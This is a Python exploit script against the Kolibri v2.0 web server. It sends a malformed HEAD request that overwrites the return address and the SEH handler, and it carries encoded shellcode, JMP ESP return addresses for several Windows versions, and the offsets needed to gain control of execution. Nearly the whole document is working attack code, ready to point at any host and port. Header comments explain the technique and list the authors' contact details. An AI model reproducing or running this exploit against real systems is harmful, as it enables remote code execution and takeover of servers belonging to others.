#!/usr/bin/env python
 
#     _             ____  __            __    ___
#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / /
# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/
#                   Live by the byte     |_/_/
#
# Members:
#
# Pr0T3cT10n
# -=M.o.B.=-
# TheLeader (gsog2009 [a7] homtail [d0t] com)
# Sro
# Debug
#
# Contact: inv0ked.israel@gmail.com
#
# -----------------------------------
# Bug discovered by Pr0T3cT10n 
# Exploited by TheLeader, Debug
# -----------------------------------
# Description:
#
# Kolibri v2.0 is vulnerable to a remote buffer overflow attack.
# By sending a malformed HEAD request, we are able to overwrite both the return address and an SEH handler.
# Null bytes terminate the request though, but we are able to partially overwrite with a pointer to
# a POP + POP + RET instruction inside kolibri.exe and gain control over the execution via SEH.
# This although gets complicated because the SEH handler offset between XP/2K3 and Vista/W7 is different
# by 2 bytes (probably due to local stack variables), thus we are able to cover only 2 operating system with the SEH overwrite exploit.
#
# In order to successfully exploit the RET overwrite, we need to either overwrite ret with jmp to the stack
# and then overwrite the stack with our shellcode, or find another way to get to our shellcode. Since null
# terminates the request string, it is impossible to pratially overwrite RET with an address from the binary
# and then overwrite with shellcode. We attempted finding another reliable way to get to our shellcode but haven't succeeded.
# The most reasonable option left is to overwrite RET with an OS specific address from a DLL that gets loaded by Kolibri.
# -----------------------------------
#
# Exploit Title: Kolibri v2.0 Buffer Overflow RET + SEH exploit (HEAD)
# Date: 24/12/2010
# Author: TheLeader
# Affected Version: Kolibri-2.0
# Tested on: Windows 7 x86 ENG/HEB , Windows Server 2003 SP2 ENG, Windows XP SP3 ENG
# ISRAEL, NULLBYTE.ORG.IL
 
import socket
import sys
 
print "\n  Kolibri v2.0 Buffer Overflow RET + SEH exploit"
 
usage = (
"  Usage: kexploit.py host port [mode]\n\n"
"  Modes:\n"
"    1 - RET = XP SP3 ENG, SEH = VISTA + WIN7 (default)\n"
"    2 - RET = SERVER2003 SP2 ENG, SEH = VISTA + WIN7\n"
"    3 - RET = XP SP3 ENG, SEH = XP + SERVER2003\n"
"    4 - RET = SERVER2003 SP2 ENG, SEH = XP + SERVER2003\n"
)
 
if len(sys.argv) < 3:
    print usage
    sys.exit(0)
 
host = sys.argv[1]
 
try:
    port = int(sys.argv[2])
except ValueError:
    print "  [-] Error: port must be numeric!"
    sys.exit(1)
 
if len(sys.argv) > 3:
    try:
        mode = int(sys.argv[3])
    except ValueError:
        print "  [-] Error: mode must be numeric!"
        sys.exit(1)
else:
    mode = 1
 
# ret offsets = 213, 515
ret_offset = 515
 
seh_offset_xp_2k3 = 792 # WINXP / WS2K3
seh_offset_vista_7 = 794 # VISTA / WIN7
 
# badchars = [0x00, 0x0d, 0x0a, 0x20, 0x3d, 0x3f]
shellcode = (
"\xb8\xe2\x96\x27\xb0\x33\xc9\xda\xde\xd9\x74\x24\xf4\x5b"
"\xb1\x32\x31\x43\x10\x83\xeb\xfc\x03\xa1\x9a\xc5\x45\xd9"
"\x4b\x80\xa6\x21\x8c\xf3\x2f\xc4\xbd\x21\x4b\x8d\xec\xf5"
"\x1f\xc3\x1c\x7d\x4d\xf7\x97\xf3\x5a\xf8\x10\xb9\xbc\x37"
"\xa0\x0f\x01\x9b\x62\x11\xfd\xe1\xb6\xf1\x3c\x2a\xcb\xf0"
"\x79\x56\x24\xa0\xd2\x1d\x97\x55\x56\x63\x24\x57\xb8\xe8"
"\x14\x2f\xbd\x2e\xe0\x85\xbc\x7e\x59\x91\xf7\x66\xd1\xfd"
"\x27\x97\x36\x1e\x1b\xde\x33\xd5\xef\xe1\x95\x27\x0f\xd0"
"\xd9\xe4\x2e\xdd\xd7\xf5\x77\xd9\x07\x80\x83\x1a\xb5\x93"
"\x57\x61\x61\x11\x4a\xc1\xe2\x81\xae\xf0\x27\x57\x24\xfe"
"\x8c\x13\x62\xe2\x13\xf7\x18\x1e\x9f\xf6\xce\x97\xdb\xdc"
"\xca\xfc\xb8\x7d\x4a\x58\x6e\x81\x8c\x04\xcf\x27\xc6\xa6"
"\x04\x51\x85\xac\xdb\xd3\xb3\x89\xdc\xeb\xbb\xb9\xb4\xda"
"\x30\x56\xc2\xe2\x92\x13\x3c\xa9\xbf\x35\xd5\x74\x2a\x04"
"\xb8\x86\x80\x4a\xc5\x04\x21\x32\x32\x14\x40\x37\x7e\x92"
"\xb8\x45\xef\x77\xbf\xfa\x10\x52\xdc\x9d\x82\x3e\x23")
 
ret_xp_sp3 = "\x13\x44\x87\x7C" # 0x7C874413 WINXP SP3 JMP ESP @ kernel32.dll
ret_2k3_sp2 = "\xC3\x3B\xF7\x76" # 0x76F73BC3 WS2K3 SP2 JMP ESP @ winrnr.dll
 
if mode == 1:
    ret = ret_xp_sp3
    seh_offset = seh_offset_vista_7
elif mode == 2:
    ret = ret_2k3_sp2
    seh_offset = seh_offset_vista_7
elif mode == 3:
    ret = ret_xp_sp3
    seh_offset = seh_offset_xp_2k3
elif mode == 4:
    ret = ret = ret_2k3_sp2
    seh_offset = seh_offset_xp_2k3
 
seh = "\x67\x1a\x48" # 0x0045586B @ kolibri.exe POP + POP + RET
 
nseh="\x90\x90\xeb\xf7"
jmp_back2 = "\xE9\x12\xFF\xFF\xFF"
 
buf = "\x41" * (ret_offset)
nops = "\x90" * (seh_offset - len(buf + ret + shellcode + jmp_back2 + nseh))
 
req = ("HEAD /" + buf + ret + nops + shellcode + jmp_back2 + nseh + seh + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n"
"Accept-Encoding: gzip,deflate\r\n"
"Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
print "  [+] Connecting to %s:%d" % (host, port)
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
 
print "  [+] Sending payload.."
s.send(req)
data = s.recv(1024)
 
print "  [+] Closing connection.."
s.close()
 
print "  [+] Done!"